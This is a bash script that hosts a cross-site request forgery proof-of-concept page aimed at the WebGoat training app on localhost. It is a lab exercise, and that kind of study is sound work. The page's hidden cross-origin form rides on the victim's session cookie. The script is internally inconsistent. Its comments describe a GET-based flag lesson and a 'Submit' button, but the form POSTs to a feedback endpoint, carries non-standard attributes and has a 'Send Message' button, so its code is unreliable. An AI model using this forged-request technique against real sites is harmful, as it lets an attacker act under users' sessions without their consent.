#!/usr/bin/env bash
#
# csrf_poc.sh
# Hosts a CSRF proof-of-concept page for the WebGoat "basic-csrf-get" lesson.
#
# This page lives on its own origin (default: localhost:9000) and contains
# the attacker-controlled form. For the demo to be meaningful it must NOT
# be served from localhost:8080 (WebGoat's own origin) — the point of the
# lesson is that the form submits cross-origin and the browser attaches
# your WebGoat session cookie anyway.
#
# Usage:
#   chmod +x csrf_poc.sh
#   ./csrf_poc.sh [port]        # default port 9000
#
# Then, while logged into WebGoat in the same browser, open:
#   http://localhost:<port>/
# and click Submit.

set -euo pipefail

PORT="${1:-9000}"
WORKDIR="$(mktemp -d)"
INDEX="$WORKDIR/index.html"

cat > "$INDEX" <<'HTMLEOF'
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 600px; margin: 40px auto; }
    .warn { color: #a00; font-size: 0.9em; }
  </style>
</head>
<body>
  <h2>Totally Harmless Page</h2>
  <p class="warn">CSRF proof-of-concept — targets WebGoat's basic-get-flag endpoint at localhost:8080.</p>

<form class="attack-form" accept-charset="UNKNOWN" id="csrf-feedback" method="POST" preparedata="feedback" action="http://localhost:8080/WebGoat/csrf/feedback/message" contenttype="text/plain">
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="form-group">
                                            <label for="name">
                                                Name</label>
                                            <input type="text" class="form-control" name="name" id="name" placeholder="Enter name" required="required">
                                        </div>
                                        <div class="form-group">
                                            <label for="email">
                                                Email Address</label>
                                            <div class="input-group">
                                <span class="input-group-addon"><span class="glyphicon glyphicon-envelope"></span>
                                </span>
                                                <input type="email" name="email" class="form-control" id="email" placeholder="Enter email" required="required"></div>
                                        </div>
                                        <div class="form-group">
                                            <label for="subject">
                                                Subject</label>
                                            <select id="subject" name="subject" class="form-control" required="required">
                                                <option value="na" selected="">Choose One:</option>
                                                <option value="service">General Customer Service</option>
                                                <option value="suggestions">Suggestions</option>
                                                <option value="product">Product Support</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="form-group">
                                            <label for="name">
                                                Message</label>
                                            <textarea name="message" id="message" class="form-control" rows="9" cols="25" required="required" placeholder="Message"></textarea>
                                        </div>
                                    </div>
                                    <div class="col-md-12">
                                        <button class="btn btn-primary pull-right" id="btnContactUs">
                                            Send Message
                                        </button>
                                    </div>
                                </div>
                            </form>
</body>
</html>
HTMLEOF

echo "[csrf_poc.sh] Serving CSRF PoC on http://localhost:${PORT}/  (Ctrl+C to stop)"
cd "$WORKDIR"
exec python3 -m http.server "$PORT" --bind 0.0.0.0
